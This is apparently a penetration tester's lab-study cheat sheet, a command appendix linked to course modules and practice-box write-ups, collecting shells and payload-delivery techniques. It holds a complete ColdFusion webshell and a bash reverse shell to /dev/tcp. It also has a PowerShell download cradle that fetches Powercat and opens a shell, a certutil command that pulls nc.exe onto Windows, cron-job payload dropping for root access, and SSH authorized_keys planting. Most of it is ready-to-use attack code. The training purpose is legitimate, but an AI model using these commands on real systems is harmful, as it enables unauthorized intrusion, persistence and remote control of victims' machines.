# Shells & Payloads, Command Appendix

Part of [[COMMAND APPENDIX]]. Webshells, reverse shells, and SSH-based access/persistence.

---

## Webshells

```bash
ls -la /usr/share/webshells        # php/, asp/, aspx/, cfm/, jsp/, perl/, laudanum/
ls /usr/share/webshells/php/       # simple-backdoor.php, php-reverse-shell.php
ls /usr/share/webshells/aspx/      # cmdasp.aspx

# Edit a Pentestmonkey-style reverse shell's IP/port before hosting it
sed -i "s/\$ip = '127.0.0.1';/\$ip = '<your_ip>';/" php-reverse-shell.php
sed -i "s/\$port = 1234;/\$port = 4444;/" php-reverse-shell.php
```
```html
<!-- Self-referencing CFM webshell (ColdFusion), submits to itself and runs the cmd field -->
<html><body><cfoutput>
<form method="POST" action="shell.cfm">
<input type=text name="cmd" size=80
  <cfif isdefined("form.cmd")>value="#form.cmd#"</cfif>>
<input type=submit value="Exec">
</form>
<cfif isdefined("form.cmd")>
<cfexecute name="#Form.cmd#" arguments="" timeout="5"></cfexecute>
</cfif>
</cfoutput></body></html>
```
*The CFM shell above needs a way onto the target's own web root to be reachable. On ColdFusion Admin specifically, its Scheduled Tasks feature will fetch a URL and save the response to a file you choose, an easy way to drop the shell without any file-upload vector at all: point a new scheduled task's URL at your hosted `shell.cfm`, set "Save output to file" to a path under the app's own `wwwroot`, then run it once.*

See [[Common Web Application Attacks#9.2.3. Remote File Inclusion (RFI)|9.2.3]], [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]], [[Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1 (case study 4)]], [[Arctic|Arctic box writeup]] (the CFM shell, delivered via ColdFusion's Scheduled Tasks).

#### Tags: #Webshells #PHPWebshell #ASPNETWebshell #CFMWebshell #ScheduledTask

---

## Reverse Shells

```bash
# Bash (Linux), URL-encode if delivered via a POST body/URL parameter
bash -c "bash -i >& /dev/tcp/<your_ip>/4444 0>&1"

# Netcat listener (run this BEFORE triggering any of the below)
nc -nvlp 4444
```
```powershell
# PowerShell one-liner, base64-encode with Unicode before delivering via powershell -enc
$Text = '<powershell reverse shell script>'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText = [Convert]::ToBase64String($Bytes)
```
```bash
# Powercat (PowerShell-native netcat), host it and trigger via a download cradle
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 80
# Inject (URL-encoded): IEX (New-Object System.Net.Webclient).DownloadString("http://<your_ip>/powercat.ps1");powercat -c <your_ip> -p 4444 -e powershell
```
See [[Common Web Application Attacks#9.2.1. Local File Inclusion (LFI)|9.2.1]] (bash), [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]] (PowerShell base64), [[Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1]] (Powercat), [[Client-Side Attacks#12.2.3. Leveraging Microsoft Word Macros|12.2.3]] (delivered via a VBA macro, chunked into ≤255-char string literals), [[Client-Side Attacks#Step 4: Build the `.lnk` shortcut payload (the actual reverse-shell trigger)|12.3.1]] (delivered via a `.lnk` shortcut's target field).

> 🔗 Reverse shell one-liners for any language/encoding: revshells.com

#### Tags: #ReverseShell #Powercat #BashReverseShell #PowerShellReverseShell

---

## SSH

```bash
# Connect with a private key on a non-standard port
ssh -i <keyfile> -p <port> <user>@<target>

# Fix key permissions (required before use)
chmod 400 <keyfile>

# Clear stale host keys (needed when a hostname gets reused across different lab VMs)
rm ~/.ssh/known_hosts

# Generate a keypair to plant (e.g. via an upload+traversal authorized_keys overwrite)
ssh-keygen -f <keyname>
cat <keyname>.pub > authorized_keys

# Convert a key OpenSSL 3.x refuses to load ("error in libcrypto: unsupported")
# Root cause is usually a corrupted/truncated copy, not real incompatibility, diff against
# a mechanically re-extracted copy before chasing OpenSSL-version theories
ssh-keygen -p -m PEM -f <keyfile>
```
See [[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]] (the libcrypto troubleshooting saga), [[Common Web Application Attacks#9.3.2. Using Non-Executable Files|9.3.2]] (planting a key via upload+traversal).

#### Tags: #SSH #SSHKeyTheft #SSHKeyPlanting #LibcryptoTroubleshooting

---

## Delivering a Payload Without Direct Upload Access

Two patterns worth having as reflexes when there's no file-upload form to abuse directly, but there's another way to get a file to run.

```cmd
:: certutil, a Microsoft-signed binary that ships on every Windows install by default,
:: repurposed as a downloader (LOLBIN). No upload tool needed on the target beforehand,
:: the "downloader" is already sitting there.
cmd.exe /c certutil -urlcache -split -f "http://<your_ip>/nc.exe" C:\ProgramData\nc.exe
```
```bash
# A root-owned cron job that runs every file in a writable directory, drop a payload
# and wait for the timer, don't execute it yourself (that only gets you a shell as your
# own low-priv user, not root). Watch for the dotfile-exclusion gotcha: a bash glob like
# *.py never matches a leading-dot filename, so the payload's name must NOT start with a dot.
nc -lnvp <port>                                    # listener, start this first
echo "<reverse shell payload>" > /path/to/watched/dir/shell.py   # no leading dot
# wait up to the cron interval (often ~60s), then check the listener
```
See [[Arctic|Arctic box writeup]] (`certutil` pulling down `nc.exe` and `JuicyPotato.exe`), [[Bashed|Bashed box writeup]] (the root cron job iterating `*.py`), [[Privilege Escalation & Local Exploitation (Breakdowns)|Command Breakdowns]] for the full mechanics of both.

#### Tags: #Certutil #LOLBIN #CronPrivesc #DotfileExclusion

---

## **Outstanding**
This area grows alongside the modules. Whenever a new shell delivery mechanism comes up (Windows named-pipe shells, etc), add it here with a link back to the source section.

*(`msfvenom` syntax for generating shellcode/payloads lives in [[Buffer Overflow & Memory Corruption#msfvenom: Generating Shellcode for a BOF Payload|Buffer Overflow & Memory Corruption]], where it was first taught in depth, since [[Fixing Exploits]] is where bad-char/encoder/format flags actually mattered.)*
